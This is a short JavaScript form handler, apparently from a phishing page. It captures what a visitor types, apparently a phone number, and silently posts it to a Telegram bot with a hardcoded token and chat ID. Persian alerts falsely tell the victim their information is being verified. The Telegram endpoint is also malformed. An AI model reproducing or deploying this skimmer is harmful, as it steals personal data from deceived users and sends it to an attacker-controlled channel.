document.getElementById("loggerForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
  
    var data = document.getElementById("data").value; // Get the data from the input field
  
    // Send the data to the Telegram bot using the fetch API
    fetch("https://api.telegram.org/6020441188:AAHT5_o3FMmbsy3_OBRrFgBVE7fC6EI_5zI/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "2006739664",
        text: data
      })
    })
    .then(function(response) {
      if (response.ok) {
        alert("اطلاعات شما تایید شد لطفا منتظر بمانید");
      } else {
        alert(" لطفا شماره خود را صحیح وارد کنید 🙏 ");
      }
    })
    .catch(function(error) {
      console.error("An error occurred:", error);
    });
  });
